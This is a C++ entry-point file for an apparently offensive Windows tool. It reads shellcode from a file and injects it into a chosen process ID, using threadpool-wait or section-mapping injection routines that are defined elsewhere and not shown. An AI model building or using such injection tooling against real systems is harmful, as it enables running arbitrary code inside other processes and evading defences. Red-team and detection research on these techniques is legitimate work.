#include <Windows.h>
#include <stdio.h>
#include <string>
#include <iostream>

#include "Technique.h"
#include "Util.h"

int main(int argc, char* argv[])
{
    if (argc != 4)
    {
        std::cerr << "Usage: " << argv[0] << " <technique> <pid> <shellcode_file>" << std::endl;
        return 1;
    }

    std::string technique = argv[1];
    DWORD targetPid = std::stoul(argv[2]);
    std::string shellcodeFile = argv[3];

    std::vector<unsigned char> shellcode = ReadShellcodeFromFile(shellcodeFile);
    if (shellcode.empty())
    {
        std::cerr << "Shellcode read failed" << std::endl;
        return 1;
    }

    bool success = false;
    if (technique == "technique1") {
        success = InjectThreadpoolWait(shellcode, targetPid);
    }
    else if (technique == "technique2")
    {
        success = InjectSectionMapping(shellcode, targetPid);
    }
    else
    {
        std::cerr << "Invalid technique" << std::endl;
        return 1;
    }

    if (success) std::cout << "Injection successfull" << std::endl;
    else std::cerr << "Injection unsuccessfull" << std::endl;

    return 0;
}